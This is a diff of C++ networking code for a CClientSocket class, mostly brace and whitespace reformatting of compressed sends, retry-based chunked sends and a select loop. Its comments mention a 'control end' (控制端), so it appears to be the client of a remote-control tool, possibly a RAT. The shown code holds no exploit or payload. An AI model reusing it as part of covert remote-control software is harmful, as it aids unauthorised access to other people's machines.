@@ -244,7 +244,7 @@ bool CClientSocket::ConnectProxyServer(LPCTSTR lpszHost, UINT nPort)
 DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
 {
 	CClientSocket *pThis = (CClientSocket *)lparam;
-	char	buff[MAX_RECV_BUFFER];
+	char	buff[MAX_RECV_BUFFER] = {0};
 	fd_set fdSocket;
 	FD_ZERO(&fdSocket);
 	FD_SET(pThis->m_Socket, &fdSocket);
@@ -252,8 +252,7 @@ DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
 	while (pThis->IsRunning()) {
 		fd_set fdRead = fdSocket;
 		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
-		if (nRet == SOCKET_ERROR)
-		{
+		if (nRet == SOCKET_ERROR) {
 			pThis->Disconnect();
 			break;
 		}
@@ -391,19 +390,16 @@ int CClientSocket::Send( LPBYTE lpData, UINT nSize )
 
 	m_WriteBuffer.ClearBuffer();
 
-	if (nSize > 0)
-	{
+	if (nSize > 0) {
 		// Compress data
 		unsigned long	destLen = (unsigned long)(nSize * 1.001  + 12);
-		LPBYTE			pDest = new BYTE[destLen];
-
-		if (pDest == NULL)
+		LPBYTE	pDest = new BYTE[destLen];
+		if (pDest == NULL) {
 			return 0;
-
+		}
+			
 		int	nRet = compress(pDest, &destLen, lpData, nSize);
-		
-		if (nRet != Z_OK)
-		{
+		if (nRet != Z_OK) {
 			delete [] pDest;
 			return -1;
 		}
@@ -427,9 +423,8 @@ int CClientSocket::Send( LPBYTE lpData, UINT nSize )
 		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
 		if (lpResendWriteBuffer)
 			delete [] lpResendWriteBuffer;
-	}
-	else // 要求重发, 只发送FLAG
-	{
+	} else {
+		// 要求重发, 只发送FLAG
 		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
 		m_ResendWriteBuffer.ClearBuffer();
 		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
@@ -442,45 +437,53 @@ int CClientSocket::Send( LPBYTE lpData, UINT nSize )
 
 int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
 {
-	int			nRet = 0;
+	int	nRet = 0;
 	const char	*pbuf = (char *)lpData;
-	UINT			size = 0;
-	int			nSend = 0;
-	int			nSendRetry = 15;
+	UINT size = 0;
+	int	nSend = 0;
+	int	nSendRetry = 15;
 	int i = 0;
+
 	// 依次发送
-	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
-	{
-		for (i = 0; i < nSendRetry; i++)
-		{
+	for (size = nSize; size >= nSplitSize; size -= nSplitSize) {
+		for (i = 0; i < nSendRetry; i++) {
 			nRet = send(m_Socket, pbuf, nSplitSize, 0);
-			if (nRet > 0)
+			if (nRet > 0) {
 				break;
+			}
 		}
-		if (i == nSendRetry)
+
+		if (i == nSendRetry) {
 			return -1;
-		
+		}
+			
 		nSend += nRet;
 		pbuf += nSplitSize;
 		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
 	}
 	// 发送最后的部分
-	if (size > 0)
-	{
-		for (int i = 0; i < nSendRetry; i++)
-		{
+	if (size > 0) {
+		for (int i = 0; i < nSendRetry; i++) {
 			nRet = send(m_Socket, (char *)pbuf, size, 0);
-			if (nRet > 0)
+			if (nRet > 0) {
 				break;
+			}
+				
 		}
-		if (i == nSendRetry)
+
+		if (i == nSendRetry) {
 			return -1;
+		}
+			
 		nSend += nRet;
 	}
-	if (nSend == nSize)
+
+	if (nSend == nSize) {
 		return nSend;
-	else
+	} else {
 		return SOCKET_ERROR;
+	}
+		
 }
 
 void CClientSocket::setManagerCallBack( CManager *pManager )
